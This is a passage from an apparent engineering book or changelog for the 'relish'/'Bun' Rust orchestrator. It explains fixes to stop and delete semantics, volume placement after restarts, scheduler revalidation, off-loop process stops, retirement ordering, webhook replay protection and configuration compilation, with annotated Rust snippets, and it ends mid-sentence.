`relish apply` refuses to start a job whose previous outcome is unknown. Our first answer was `--rerun-jobs`, the human saying "I've checked, run it again". In 0.2.0 that flag lost its recovery role. It now only mints a fresh apply operation, so jobs that already succeeded run again; a run that still has an unknown owner refuses the new admission with "acknowledge replay before another admission". The way out is `relish batch replay ID --node NODE --grant-digest DIGEST --acknowledge-side-effects`, which names the exact grant the operator checked, so an old acknowledgement can't authorise a later unknown attempt. The API accepts it only from a user with the Deployer role; GitOps, the reconciler and the service principal never can. Cron gets no exception any more either: while a definition has an unknown owner, the leader skips its occurrences, even with `overlap = "allow"`, because a new occurrence could repeat the uncertain one's side effects. Chapter 8 covers the retry budget and the crash tests behind the first version, and chapter 17 the replay that replaced it.

### One workload grant rule at both submission routes

An apply manifest and a batch request resolve their workload names and
namespaces differently, but they must ask the same authority question before
writing or dispatching. Both now call `sesame::auth::authorize_workload` after
intrinsic validation and lease checks. The helper borrows the caller and
permission map: it creates no new principal or grants. Scope, deployment and
host execution checks keep their existing order and refusal responses.

A follower still forwards the original bearer. The leader repeats the shared
rule against its authoritative grants before admitting the batch. The paired
HTTP control uses that same scoped credential for direct leader apply and
follower batch. Image workloads need deployment permission; explicit binaries
and scripts also need host-exec. Refused pairs must add no desired writes or
workload commands, and allowed pairs must reach their actual route admission.
The command acknowledgements in this authority fixture do not claim a real
process exit or container lifecycle.

## Stop means stop, delete means delete

For most of the project `relish stop web` in a cluster did two things: it deleted `web` from desired state through Raft, and it stopped the leader's own replica on the spot. Both sound reasonable. Together they made a trap. The leader's placement reconciler still had `web` recorded as converged, so when the V02 soak ran `relish stop` and then applied the same file a few seconds later, the reconciler saw the same specification come back and skipped it. The app stayed down. And there was no way at all to remove an app, short of GitOps.

Now there are two commands with two meanings. `relish stop` writes `AppStop`, which keeps the specification and puts the app in `stopped_apps`; the scheduler treats a stopped app as an override of zero replicas, and every node's reconciler retires its instances the ordinary way, the leader's included. Applying the app clears the mark. `relish delete` writes `AppDelete`, which removes it altogether. Neither reaches past a reconciler to stop a container itself, so the bookkeeping that decides what to redeploy is never out of step with what runs.

Keeping the specification had a side effect we missed. Every node's routing table gets the cluster's ingress routes from the leader, built by walking the apps in desired state, and a stopped app is still in there. So its route stayed, with no backends behind it, and the proxy answered its host with 503 instead of 404. The next soak pulse caught it: `ingress_removes_route_after_stop` waited five minutes for a 404 that never came. `cluster_ingress` now skips anything in `stopped_apps`:

```rust
desired
    .apps
    .iter()
    .filter(|(id, _)| !desired.stopped_apps.contains(*id))
```

`filter` hands the closure a reference to each `(key, value)` pair, so `id` is a `&&AppId` there; `*id` strips one layer to get the `&AppId` that `contains` wants. A stopped app keeps its service and VIP, though, with zero backends, so the same name and address come back when you apply it again.

A single Bun without a cluster got that last part wrong. There's no council there, so `relish stop` stops the replicas itself and keeps them owned, `Stopped`, for the next apply to replace. Once every exit is confirmed, the stop releases the app's service entry and ingress route, which is right for a stopped app: nothing should resolve to it. But the apply that follows sees owned replicas and takes the redeploy path, and a redeploy assumes the service it publishes backends into is already there. It wasn't, so the first replacement failed with "cannot publish backend for default/web: service not found" and the rollout rolled back to replicas that were already stopped. The fresh-deploy path registers the service; the redeploy path never had to, until stop started keeping replicas around. Now, before it rolls anything, the redeploy puts back whatever a stop released: the service, if the app has a port and the map doesn't have it, and the ingress route, if none is stored. The VIP is a hash of the app's name, so the service comes back at the address it had before, just as the cluster catalogue keeps it. Cluster mode never hit this, because there the reconciler retires the replicas outright and the next apply is a fresh deploy.

"If none is stored" was the right rule for a stopped app and a trap for a running one. While fixing the stop, we noticed that a redeploy of a running app never touched its stored route at all, beyond an insert at the very end of the rollout. Change the host and it happened to work, because that insert overwrote the entry and a final rebuild picked it up. Delete the `[app.web.ingress]` section and nothing removed anything: the old host kept routing to the new instances. The same stale entry leaked into cluster mode, where a replica node merges its own stored routes under the council's catalogue. The council dropped the route, the node's copy kept it alive. The end of the rollout (`finalise_rolling_deploy`, which blue-green shares) now makes the rolled-out spec the owner of the route, whichever way it changed:

```rust
let key = (namespace.to_string(), app_name.to_string());
match &spec.ingress {
    Some(ingress) => {
        self.ingress_configs.insert(key, ingress.clone());
    }
    None => {
        self.ingress_configs.remove(&key);
    }
}
self.rebuild_routing_table().await;
```

The pre-rollout restore still only inserts. Until the new instances are serving, the old host is the one that should answer. `redeploy_with_a_changed_ingress_host_moves_the_route` runs `a.test`, then `b.test`, then no ingress, under both rolling and blue-green, and checks that `b.test` reaches the new instances, `a.test` stops, and nothing is left at the end. Its cluster twin feeds the same three specs through a replica node alongside matching council catalogues, and a state-machine test checks the catalogue itself.

### A stopped app forgets where its data is

Keeping the specification wasn't enough, either. The V02 soak's `volume_data_survives_instance_restart` case writes a marker into a managed volume, stops the app, applies it again and reads the marker back. On one fast-tier run it got this:

```text
marker did not survive the restart: "cat: can't open '/data/marker': No such file or directory"
```

Nothing had deleted anything. A stopped app is scheduled at zero replicas, so the leader commits a scheduling decision with no placements, and that empty list replaced the only record of where the app had run. The next `apply` sent it through the scheduler like a brand-new app, and the scheduler picked whichever node scored best that second. On a different node, Bun provisioned a fresh, empty volume under the same name. The marker was still sitting on the first node. For the user, that's data loss all the same, and the manual promised the opposite: a managed volume "survives restarts and redeploys", and its snapshot recipe is stop, restore, apply.

The soak had passed this case before only by luck. It pins its own volume apps to nodes 2 and 3, so a fresh app usually landed on node 1 both times. And until the previous fix, when it didn't, the exec went to the wrong node and failed with a 404, which looked like a test bug.

The fix is one more field in desired state, `last_placed_nodes`, which the state machine fills from every decision that places something and leaves alone when a decision is empty. `relish delete` clears it. The planner consults it only when an app with a managed volume has no placement left to keep:

```rust
struct VolumeHome<'a> {
    cache: &'a mut ClusterStateCache,
    alive: &'a HashSet<NodeId>,
    unheard: &'a HashSet<NodeId>,
    dns_required: bool,
}
```

A struct that holds references needs a lifetime parameter, `'a`, which tells the compiler the struct can't outlive the cache and sets it borrows. Go would let you keep a pointer to the cache for as long as you liked. Here, `VolumeHome` is built inside one scheduling pass and gone by the end of it, and the compiler checks that. Its `reserve` method takes `self` by value, so calling it consumes the struct and releases the mutable borrow of the cache, and the rest of the pass can use the cache again.

`reserve` sorts each home node into one of three outcomes. A home that's alive, ready and still matches the app's required labels gets the replica. A home that could run it but has no room makes the app wait, because starting it elsewhere is exactly the bug. A home that's gone, or that the operator has excluded with new labels, is dropped, and that replica goes through the normal scheduler: losing a local volume with its node is the documented trade-off of local storage. It checks every home before reserving any of them, so an app that ends up waiting doesn't leave phantom reservations behind for the apps after it in the same pass.

The gated cluster test `a_stopped_volume_app_starts_again_on_the_node_that_holds_its_volume` reproduces the soak deterministically. Three nodes carry zone labels; the app is pinned to zone `b` and lands on `v2`. Then it's stopped and applied again without the pin, so every node is empty and the scheduler, left to itself, picks `v1`, the lowest node id. Before the fix, it came back on `v1`. The new field changes the durable state format, so `compatibility::CURRENT` moved to state 44.

### "Not ready" isn't "gone"

The final-tier soak on the fixed candidate failed the same case, with the same message. This time the record of where the app ran was intact. What let us down was the line that dropped a home node that was "gone, not ready, or no longer matching the labels".

Look at how the leader decides a node isn't ready. Each node's report worker sends a state report, a capability report and a readiness report every five seconds. If the leader hasn't received anything from a node for 30 seconds, it keeps the last state report, lists the node as stale and throws away its readiness and capability evidence, so the cache it schedules against says `ready: false`. During that pulse, the report workers on nodes 2 and 3 logged `snapshot collection failed or timed out` every five seconds, for more than a minute each. The soak's own volume apps, pinned to those nodes by label, tell us exactly when: the leader logged `cannot place default/soak-redis: no eligible nodes` while node 3 was stale and `cannot place default/soak-writer` while node 2 was. The test app's re-apply landed inside node 2's window. Its home looked not ready, so it was dropped like a dead node, and the scheduler started the app on another node with a fresh, empty volume. The node had been alive the whole time, with the marker on its disk.

The pinned apps were only lucky: a label pin leaves the scheduler nowhere else to go. An unpinned app with a volume was worse off than the test. `placement_holds` decides whether a *running* placement can stay, and it said no for a stale or not-ready node, so a running database would have been restarted elsewhere on an empty volume. The upgrade cordon sets `ready: false` on the node being upgraded, so every `relish upgrade` walk would have done it on purpose.

So the rule is now stricter, and it matches what the manual already promised. Only two things release a volume's node: gossip no longer having it alive, and the operator's `placement.required` labels excluding it. Everything else is a reason to wait, and the waits say why:

```rust
enum HomeOutcome {
    Placed(Vec<crate::meat::types::Placement>),
    Wait { node: NodeId, reason: HomeWait },
}

enum HomeWait {
    Unreported,
    NotReady,
    NoRoom,
}
```

`Wait` is a struct-like variant: its fields have names, like a C struct inside a tagged union, and a `match` binds them by name (`HomeOutcome::Wait { node, reason } => ...`). `HomeWait` implements `std::fmt::Display`, the trait `{}` formatting calls, which is Rust's equivalent of Go's `String()` method, so the log line reads `waits for rb-2, which holds its volumes: it isn't ready` instead of printing a debug dump.

`placement_holds` gets the same rule for running apps. A fixed-replica app with a managed volume keeps its placement for as long as its node is alive:

```rust
if unheard.contains(&placement.node_id) || has_managed_volume(spec) {
    return true;
}
cache
    .get_node(&placement.node_id)
    .is_none_or(|node| node_can_run(node, spec, dns_required))
```

`Option::is_none_or` is true for `None`, and otherwise calls the closure on the value inside. It replaces a `let ... else` with an early return: a node the leader has no report for keeps its placements, and a reported one keeps them only if it can run the app.

We did think about keeping the old behaviour for "reported, fresh and not ready", which is real evidence of trouble, and moving only on silence. It doesn't help. A node that reports not ready still has the data, and a stateful app that's down until its node recovers is a better outcome than one that's up with nothing in it. Kubernetes makes the same call for local persistent volumes: the pod stays pending, bound to its node. An operator who really wants the app elsewhere changes its labels, or retires the node.

The first test builds the scheduler's view the way the leader does, from an `AggregatedState` with node `home` listed stale, through `build_cluster_cache` and `unheard_nodes`. Before the fix, it placed the app on `busy`. A second test does the same for a running app, and checks that a node gossip has declared dead still releases it.

The report worker's stalls are their own problem, and they're still open. Even with this fix, they make the leader move apps *without* volumes off a node that is running them fine.

## A restart is not a loss

"Gossip no longer has it alive" turned out to be the wrong line too. An outside tester ran three-node clusters on EC2, ran `systemctl restart bun` on the node holding a volume app, and watched the app turn up on another node within ten seconds, on an empty volume. The data was still on the first node, and `relish wtf` said everything was fine. They got the same result six times out of six.

The reason is a courtesy. On SIGTERM, Bun cancels its shutdown token, and the gossip loop's last act is `leave()`: it tells its peers it's leaving, so they don't spend five seconds suspecting it first. Peers mark it Left at once. The leader's next pass saw a node that was neither Alive nor Suspect, so `placement_holds` dropped the placement, `VolumeHome::reserve` skipped the home with `continue`, and the scheduler put the app wherever scored best. A reboot or a SIGKILL takes the slow route to the same place: Suspect for five seconds, then Dead.

Gossip can't tell "restarting" from "gone for good", and it shouldn't have to. A local volume is lost only when someone decides the node isn't coming back. So that decision now belongs to the operator. A managed-volume placement holds whatever gossip says, until the node is decommissioned:

```rust
fn keeps_volume_home(
    placement: &crate::meat::types::Placement,
    spec: &AppSpec,
    retired: &HashSet<NodeId>,
) -> bool {
    has_managed_volume(spec) && !retired.contains(&placement.node_id)
}
```

`retired` is built once per pass from the council's decommission records, with `.keys().map(NodeId::new).collect()`. `collect` builds whatever collection the left-hand side asks for, here a `HashSet<NodeId>`, so the same iterator chain could fill a `Vec` or a `BTreeSet` instead. A stopped app coming back gets the same treatment: `reserve` now answers `Wait { reason: HomeWait::Away }` for a home that is out of the cluster, and lets go only of one that was decommissioned.

Keeping the app back is only half of it. An app that silently doesn't run is barely better than one that silently runs empty, which is why the tester's `wtf` saying "all OK" mattered as much as the move. The council's per-app evidence (`/v1/diagnostics/apps`) now carries `volume_home_away`: the home node, when that node isn't a live member. `relish status` and `relish inspect` print "waits for node-2, which holds its volume and is out of the cluster", the dashboard shows the app as blocked, and `wtf` raises a critical finding that names both ways out: bring the node back, or run `relish decommission-node` and accept an empty volume.

The cost is availability. A three-replica volume app that loses a node runs two replicas until the node returns or is decommissioned, where it used to get a fresh, empty third straight away. We think that's the right trade for local storage, and it's the one Kubernetes makes for local persistent volumes. If you want the app to survive losing a node without anyone stepping in, its data has to live somewhere other than that node.

The gated test `restarting_bun_on_a_volume_apps_node_never_moves_the_app` restarts the home node's agent the way systemd does: it cancels that node's shutdown token, keeps it down for fifteen seconds (well past the suspicion timeout), and checks that no other node runs the app or provisions a volume for it in that time. Then it starts the node again on the same data directory and checks the app comes back there, with the marker it wrote before the restart. Before the fix it failed about two seconds after the stop, with the app running on the other zone-`b` node.

## Changing a running app

An audit of the scheduler after 0.1.3 found three holes, all in what a pass believes about placements it committed earlier.

The first was a lag. A pass starts from the nodes' reports, and a report trails the council by a tick or more. Commit app `a` (600m) to a 1000m node, and the next pass, working from a report that doesn't list `a` yet, sees 1000m free and happily commits app `b` (another 600m) to the same node. Now each pass rebuilds what the reports are missing before it admits anything: for every committed placement beyond the replicas its node reports, it reserves the committed footprint in the pass's cache (#432).

The second was a daemon set paying for itself twice. A daemon's eligibility asked "does this node have room for a copy?", and on a node already running the 600m copy the answer was no (400m left), so the next decision dropped the healthy copy it was asking about. The pass now credits each node's committed copy back before asking (#433), but only in a throwaway view of the cache. The real cache keeps the allocation, so no other app can spend that room.

The third was a spec change slipping past admission. Raise an app's request from 600m to 2000m, or change its `placement.required` to another zone, and the old placement still counted as converged: `placement_holds` asked whether the node was alive and ready, never whether it still admitted the spec. The first fix proposed dropping the app's placements in the state machine whenever its request or selector changed. That would have been correct, and it would have retired every replica at once: each node agent rolls its own replicas to a new spec, and a node with no placement for the app stops it. A memory bump would have been an outage.

So the pass revalidates each placement where it runs instead, in `Liveness::keeps`:

```rust
if cache
    .get_node(&placement.node_id)
    .is_some_and(|node| !node.matches_labels(&required))
{
    return false;
}
if keeps_volume_home(placement, spec, self.retired) {
    return true;
}
placement_holds(placement, spec, cache, self.alive, self.suspect,
    self.unheard, self.dns_required) && admits_in_place(placement, spec, cache)
```

The order is the policy. A changed hard selector is the one spec change that moves a replica, volume or not, because the operator asked for other nodes. After that, a managed-volume app stays on its home whatever else is going on, a new request included, since its data is there. Everything else must also fit: `admits_in_place` credits back the footprint the placement was committed with and checks the new request against what's left, because the resized replica replaces the old one rather than running beside it. A replica that passes keeps its node, and the decision records its new footprint, so a resize rolls in place. One that doesn't fit is placed elsewhere.

The daemon credit had to learn the same lesson. Crediting the copy at the *new* request would let a daemon grown from 600m to 900m claim 900m of room it never had, so the scheduler gets the footprints the copies were committed with (`with_daemon_credit`) and trades each one for the new request. A copy that runs without a committed placement (one on its way out) earns no credit at all.

There is a window this leaves open: a node agent can roll to the new spec before the leader's next pass decides the replica must move. The pass then places it elsewhere and the agent retires it, a tick later. We took one tick of a replica running where it shouldn't over a guaranteed outage for every resize.

The tests in `revalidation_in_place` pin each rule down, including where the fixes meet: a replica no node has reported yet is resized against its rebuilt footprint, not on top of it, and a volume app whose request outgrows its home stays there even while that home is restarting.

## Two seconds is too eager

Each node's placement reconciler polls the leader every couple of seconds and deploys whatever its share of the placements says. If a deploy failed, the next poll simply tried again. Kubernetes has `CrashLoopBackOff` for exactly this; we had a supervisor back-off for instances that crash after starting, but a deploy that never produces a running instance never reaches the supervisor. The V02 soak found the result: an app whose binary had been truncated by a power cut reached generation `g170` in eight minutes, every attempt a fresh container, a fresh journal entry and a fresh log line.

`DeployBackoff` remembers consecutive failures per placement and the specification they were for. The same specification waits 5 s, then 10, 20, 40, up to five minutes; a changed specification is new desired state and is tried at once, with the count reset. Success clears the record, and so does the leader withdrawing the placement. Eight minutes of a broken app is now a handful of attempts, and the journal says when the next one is due.

## A stubborn process shouldn't freeze the node either

We moved deploys off the command loop and thought we were done. The V02 soak disagreed. Its journals filled with `agent status timed out`, `snapshot collection failed or timed out` every five seconds, and `retirement of … exceeded ten seconds; ownership retained`, all on a node that was doing nothing more exciting than retiring a few apps.

The apps were `busybox sleep` and `httpd`. Run as PID 1, both ignore SIGTERM, and so do plenty of shell scripts. That's fine as far as correctness goes: the stop sends SIGTERM, waits out the ten-second grace, sends SIGKILL and confirms the exit. The trouble was *where* it waited. `Stop` and `Retire` still ran inside `handle_command`, so the loop sat in that grace for ten seconds per app. Status requests timed out behind it (their limit is five seconds). The report worker gave up. A second retirement queued behind the first, and a third behind that. A burst of stubborn retirements made the node deaf for tens of seconds.

The fix follows the deploy worker's rule: slow waiting moves to a task, and every state change stays on the loop. A stop now has three parts:

1. `begin_app_stop` runs on the loop. It retires the schedule, withdraws the app's routing and moves its instances to `Stopping`. Nothing's been signalled yet.
2. `app_exit_wait` builds a future that owns clones of everything it needs (the grill, the drain tracker, the grace) and borrows nothing from the agent. It drains each replica, sends SIGTERM, waits out the grace and escalates to SIGKILL, for every replica at once.
3. `finish_app_stop` runs on the loop again, once the wait reports back. It records `Stopped`, commits job phases and releases the instances' artifacts and discovery keys. A retirement then forgets ownership, and a lease retirement removes its test storage.

The signature of the middle step is where Rust earns its keep:

```rust
fn app_exit_wait(
    &self,
    stop: &AppStop,
) -> impl std::future::Future<Output = Result<(), BunError>> + Send + 'static {
    // … clone the grill, the drains, the grace …
    async move {
        let waits = ids.iter().map(|id| {
            drain_and_stop_instance(&drains, &grill, id, grace, confirmation_timeout)
        });
        futures_util::future::join_all(waits)
            .await
            .into_iter()
            .find_map(Result::err)
            .map_or(Ok(()), Err)
    }
}
```

`'static` is the promise that the future holds no borrowed references, so it can outlive the call that made it. If the `async move` block had quietly captured `self`, the compiler would reject the signature, because `self` is only borrowed for the length of the call. In Go you'd find that mistake at run time, as a data race; here it doesn't build. `join_all` polls every replica's wait together, so three stubborn replicas cost one grace, not three.

The agent keeps these futures in a `tokio::task::JoinSet`, a set of spawned tasks you can await in completion order, and the loop's `select!` gains one arm:

```rust
Some(outcome) = self.stop_waits.join_next_with_id(),
    if !self.stop_waits.is_empty() => {
    self.complete_app_stop(outcome).await;
}
```

The `if` after the future is a `select!` precondition: while nothing is stopping, the branch is switched off rather than polled. `join_next_with_id` hands back the finished task's id even when the task panicked, which is how the loop always finds the callers waiting on that stop, so nobody waits forever.

Moving the wait off the loop opened gaps that the old serial code closed by accident, because nothing else could run in the middle of a stop. Each one needed an explicit answer:

- **A second stop of the same app** joins the pending one. It doesn't signal again, and both callers get the outcome.
- **A deploy of an app that's still stopping** is refused with "still stopping; retry". The reconciler retries anyway, and a deploy mustn't replace instances that a stop still owns. The refusal covers the whole apply: a standalone `relish apply` of several apps fails if any one of them is still stopping, and goes through once that stop confirms.
- **Shutdown with stops pending** aborts the waits (shutdown SIGTERMs and kills everything itself) and tells each caller the stop was unconfirmed, so they keep what they own.
- **A crash mid-stop** leaves the instances owned and unconfirmed, exactly as before. In a cluster the reconciler still has them recorded, so it sends `Retire` again after the restart, and that stop starts over. A standalone `relish stop` has no reconciler behind it: if the agent crashes mid-stop, the request is lost, and you run `relish stop` again.
- **The egress fence**, which stops an app whose kernel egress policy has vanished, used to call the inline stop from the health tick, so it stalled the loop in exactly the same way. It now starts the same off-loop stop. If a stop is already pending for that app, the fence marks it instead, and if that stop then fails, its completion force-kills the app straight away rather than waiting for the next tick.

The agent was only half the stall. On each cycle the node's placement reconciler sent `Retire` for every app it no longer owned, one at a time, and gave each ten seconds for queueing and reply. That's the same ten seconds as the stop grace, so a stubborn app's retirement *always* timed out on the first try, and five of them held up the reconciler (and every deploy queued behind it) for fifty seconds. The deadline now comes from the stop itself: `stop_completion_bound` adds up the worst case (a drain of up to one grace, the grace, and three runtime confirmation timeouts), and the reconciler adds its queueing allowance on top. A cycle's retirements go through `buffer_unordered(4)`, a stream adaptor that keeps up to four futures in flight and yields each result as it lands, so five stubborn retirements cost about one grace, not five. A test with a stand-in agent whose every stop takes a grace checks that three retirements finish inside two graces, each on its first attempt; one at a time they took 4.5 s for three 1.5 s stops.

What didn't change is the guarantee that matters: a port, an address or a volume is released only after the runtime has confirmed the old process is gone. `Retire` still answers only after the exit, and the tests hold both ends of that. With a process-runtime workload running `sh -c "trap '' TERM; sleep 60"`, `Status` must answer in under a second while the stop waits, the stop must take at least the grace and end with the process gone, a retirement must keep its instance listed until the exit, and two stubborn stops must finish in under 1.8 graces (one after the other they can't take less than two). Each of those fails against the old loop. The overlap test, for example, reported `4.03s for two 2s graces`.

### Retire first, deploy second

Side-by-side retirements fixed the stops. They didn't fix the order. A reconcile cycle deployed first, one app at a time, and each deploy may wait up to five minutes for its terminal event. Only then did it retire the placements that had left the node. After a node went stale, or when a cluster powered back on, the surviving nodes had a wave of rescheduled replicas to start, and every retirement on those nodes queued behind the wave. The V02 soak saw it as test-lease cleanup: the owner was the leader, busy rolling out frontend replicas it had inherited from a killed worker, and the release outlived `lease_retirement_bound`, whose doc comment had to admit the gap ("a deploy it's still finishing runs first").

Two changes close it. The cycle now retires before it deploys. A retirement only covers placements that are already gone from this node, so running it first costs no availability, and it frees ports, addresses and volumes for the deploys that follow. That handles what was due when the cycle started. For what becomes due *during* a long deploy, the reconciler already polled the leader on every tick while it waited (the producer can need this node's withdrawal receipt before it can finish). It used to throw that answer away. Now it retires whatever the fresh answer says has left.

Retiring in the middle of a deploy raises the one-writer question from #267. What if the app that's deploying is the one the fresh answer withdraws? The retirement skips it: `retire_departed` takes the in-flight placement as `busy`, and it waits for the next cycle, after its deploy has finished. The agent would refuse the overlap anyway (a stop of an app that's deploying gets `WorkloadBusy`, a deploy of an app that's stopping gets "still stopping"), but the reconciler shouldn't lean on refusals it then has to retry. The other direction matters too. If a fresh answer withdraws an app the cycle hasn't reached yet, the cycle skips it rather than deploying it from the older answer. For a volume app that the leader has just moved elsewhere (#269), that stale deploy would have been a second writer on another node.

The retirement code moved into a small struct that borrows what it needs from the reconciler:

```rust
struct Retirer<'a> {
    node_name: &'a str,
    cmd_tx: &'a mpsc::Sender<AgentCommand>,
    client: &'a reqwest::Client,
    // ...
}

impl Retirer<'_> {
    async fn retire_departed(
        &self,
        applied: &mut AppliedMap,
        leader_url: &str,
        assignments: &NodeAssignments,
        busy: Option<&(String, String)>,
    ) -> Option<()> { /* ... */ }
}
```

`<'a>` is a lifetime parameter. A struct that holds references has to say how long they're valid, and `'a` names "as long as the reconciler's own values", so the compiler rejects any `Retirer` that could outlive them. In C you'd just store the pointers and hope. In the `impl` we don't care which lifetime it is, so `'_` asks the compiler to fill it in. The map of owned placements is *not* in the struct. It's passed as `&mut AppliedMap` on each call, because the deploy loop changes it between calls, and Rust won't let one value hold a long-lived mutable borrow while another piece of code writes to the same map.

There was one trap. While the reconciler retires, it isn't reading the deploy's event stream. The agent never lets a slow reader hold a deploy hostage: when the stream's buffer is full, it closes the stream, and the reconciler would then see a perfectly healthy deploy as "closed without an outcome". So the stream now drains on its own task. `tokio::spawn` returns a `JoinHandle`, which is itself a future that resolves to the task's result, so `select!` can wait on it exactly as it waited on the inline future before. On shutdown the reconciler calls `abort()` on it instead of leaving it to run out its five minutes.

Four tests pin this down, each with a stand-in leader whose answer the test rewrites mid-flight. A retirement due at the start of a cycle must reach the agent before the cycle's deploy, which never finishes. A lease released while a deploy hangs must be retired and acknowledged well inside `lease_retirement_bound`. A volume app that leaves the node during its own deploy must be retired only after that deploy completes, and redeployed only after the retirement answers. A placement withdrawn during another app's deploy must never be deployed. Three of them failed against the old order; the fourth passes either way and fails as soon as the `busy` exclusion is removed.

## What we deferred

Blue-green deploys, autoscaling, the Lettuce GitOps engine, and Kubernetes migration tools are all Phase 9. The `DeployPhase` enum already carries the blue-green states (you'll have spotted `StartingGreen` and friends in the transition tests), and the agent dispatches `strategy = "blue-green"` to its own path, but we'll cover that in Chapter 9. Rolling deploys with automatic rollback cover the vast majority of production deployment needs, and they're the foundation everything else builds on.

### Queueing a webhook is an observable operation

A valid signature doesn't prove the sync loop received a notification. The HTTP
handler used to discard a failed channel send and return 202 even after the
receiver had gone away. On a standalone API it reserves queue capacity first
and returns 503 if the loop is unavailable or its queue is full. Only an authenticated, validated
delivery uses the reservation and receives “sync queued”.

The reservation also prevents an awkward retry bug. Validation records the
delivery ID for replay protection; doing that before discovering a full queue
would make the provider's retry look like a replay. We reserve before validation,
so a rejected delivery can be retried after capacity becomes available. Tests
close the receiver and fill the queue, then drain one slot and retry the same ID.

In a cluster, a local notification is too weak: a follower can consume it while it is idle, and a leader can lose it during handover. An authenticated request arriving at a follower is forwarded with its original raw body, signature or GitLab token and delivery ID. The leader returns 202 only after Raft commits a pending trigger generation and a bounded delivery receipt. An unavailable leader, rejected write or forwarding loop returns 503; a canceled or failed admission restores the local replay and rate reservation so the provider can retry.

The runner watches committed trigger generations and leadership changes as well as the polling timer. A new leader sees accepted pending work immediately. A successful run acknowledges the generation it captured before starting; a newer webhook arriving during that run stays pending for another run. Failure keeps the trigger pending and uses the existing retry backoff. Stale status updates preserve newer generations and the bounded replay receipt inventory instead of overwriting them. That inventory retains the most recent 1,000 committed delivery IDs; an older delivery can be admitted again after eviction.

The handover tests cover the persisted trigger and replay receipt before a run starts. Resource and status writes continue to use the runner’s existing Raft writes and periodic drift reconciliation. An entire Git sync has no captured leadership-term guard or atomic transaction.

The five-second admission budget surrounds the whole handler, including waiting for the validator mutex and reading follower metadata. Timing just the eventual HTTP exchange leaves an unbounded queue before that timer starts. If the whole budget expires, dropping the inner future drops its admission guard and restores the local reservations. The tests hold each real lock across an HTTP request, require a 503 with no trigger or wakeup, then release it and retry the exact delivery ID with a one-request rate budget.

The same idea had one more place to go. Inside the validator, the replay check
recorded the delivery ID and only then asked the rate limiter (B10). A delivery
over the per-minute budget was refused as rate-limited, but its ID was already
in the "seen" set, so when GitHub retried it a minute later it was refused
again, this time as a replay, and stayed refused until the ID aged out of the
set. Admission is now all or nothing: both checks run first, and only a
delivery that passes both records its ID and takes a slot in the window.

Testing that needed control of time. The window used to read
`Instant::now()` directly, so a test would have had to sleep for a minute. The
validator now holds a clock:

```rust
pub type Clock = Box<dyn Fn() -> Instant + Send>;
```

`dyn Fn() -> Instant` is a *trait object*: any closure or function that takes
nothing and returns an `Instant`, called through a pointer, much like a
function pointer in C that can also carry captured state. `Box` puts it on the
heap because different closures have different sizes, and `+ Send` lets the
validator move between threads inside its `Mutex`. Production passes
`Box::new(Instant::now)`; the test passes a closure that adds a shared counter
of seconds to a fixed start. It exhausts a budget of one, gets a second
delivery refused as rate-limited, moves the clock 61 seconds on, and expects
that same delivery to be accepted, and a replay of it after that to still be
refused. Before the fix the retry failed as "duplicate delivery ID (replay)".

## Compiling a tree without losing namespace ownership

Put `web` in both `prod/web.toml` and `staging/web.toml`, then compile the tree. The namespaces differ, but `Config` stores apps under their bare names. Inserting the second `web` used to replace the first without even a warning. The same problem affected jobs and builds.

Until one serialised manifest can represent repeated names across namespaces, the compiler refuses this tree and names both namespaces in its error. Apply the manifests separately or give the resources distinct names. Treating an unrepresentable identity as an error keeps the output honest: a successful compile cannot quietly omit a namespace's workload. Same-namespace duplicate definitions keep the existing deterministic last-file-wins policy and its warning.

The merge returns `Result<Vec<String>, RelishError>`: warnings are the successful value, while an identity collision is an error. The `?` operator on each recursive merge returns that error all the way to the CLI, so it cannot print a partial manifest. Regressions cover apps, jobs and builds with explicit namespaces, plus two directory-derived app namespaces.

## A compile either includes the whole tree or fails

A malformed workload next to a valid one used to produce a warning and a successful partial manifest. The CLI printed that manifest and exited zero, so a build pipeline could deploy it as if every file had been processed. Malformed defaults and unreadable subdirectories had similar escape paths.

Parsing and reading errors now return through `Result` and `?`, including errors from recursive directories. Defaults must load successfully before the compiler considers workloads, and a broken TOML symlink is an error with its path. Duplicate-definition warnings remain separate from missing input. Regression fixtures mix good and bad files, repeat the case in a nested namespace directory, break a defaults file and supply an unreadable symlink. Each must fail before the CLI can emit a partial manifest.

## Defaults must survive compilation

A shared `memory` limit is useful only if it reaches the resolved app. The old directory compiler accepted any TOML keys in `_defaults.toml`, but copied only `image`. Typed defaults now carry image, memory, CPU and environment into apps and jobs, plus deployment settings into apps. Unknown keys and malformed values fail with the defaults file's path. A default image does not turn an explicit host executable or script into a container.

Inheritance merges fields: a child directory can change CPU while keeping its parent's image and memory. Environment keys and deployment options merge individually. A workload's explicit fields win, including `max_unavailable = 0` and `auto_rollback = false`; omitted options inherit. An empty environment table adds no overrides. Regression fixtures resolve parent, child and workload values, then round-trip the manifest to prove its resource settings survive serialization.

### One configuration tree for CLI and GitOps

A repository containing `_defaults.toml` used to compile through the CLI and fail through GitOps: Lettuce tried to parse the defaults file as a workload. A directory namespace also disappeared on the Git path. We now pass both inputs to `compile_sources`, an internal resolver that accepts a `BTreeMap<PathBuf, String>`. `BTreeMap` visits keys in order, so the resolver can process the root files and then each child directory deterministically. The filesystem adapter reads the tree; the Git adapter reads the verified commit under the configured watch directory.

Both paths inherit typed defaults and use the nearest directory name when a workload omits its namespace. The watch root itself contributes no namespace. The resolver returns `Result<CompileResult, TreeError>`: `?` propagates a malformed file or identity collision before a caller can use partial desired state. GitOps refuses duplicate definitions, while CLI compilation retains its warning for deterministic overrides within one namespace. Neither can represent two resources of the same kind and bare name in different namespaces.

The regression compares physical CLI compilation with a real Git sync under a watched subdirectory, first unsigned and then with a trusted SSH commit signature. It checks the resulting app specification and resource identity. Other cases cover nested defaults, directory-only namespaces, duplicate definitions and malformed trees. These exercise the adapters and the sync diff as well as the resolver.
### Comparing a complete deployment specification

A dry run used to compare only image strings. Keeping an image unchanged while
changing replicas, a port, environment variables or resource limits therefore
printed an unchanged workload. The preview now fingerprints the complete
serialized desired specification. Namespace is part of the resource identity:
`app.team/web` and `app.other/web` have separate evidence. Replica ordinals are
placement details, so they do not alter an app's desired-spec fingerprint.

The API returns this evidence for apps, jobs, namespace quotas and permissions.
Council state supplies the authoritative app, namespace and permission specs;
local job checkpoints supply job specs. The endpoint filters the result through
the caller's app and namespace scope. If different executions of one logical
job have different specifications, their combined evidence is unknown.

An absent fingerprint cannot prove equality. The plan prints `?` and serializes
`unknown` for incomplete evidence, while a known image change still proves an
update. An offline preview states that its creates assume no live comparison.
A failed live lookup returns an error instead of manufacturing an empty cluster.
Tests exercise the client-to-router-to-agent path and same-image changes, along
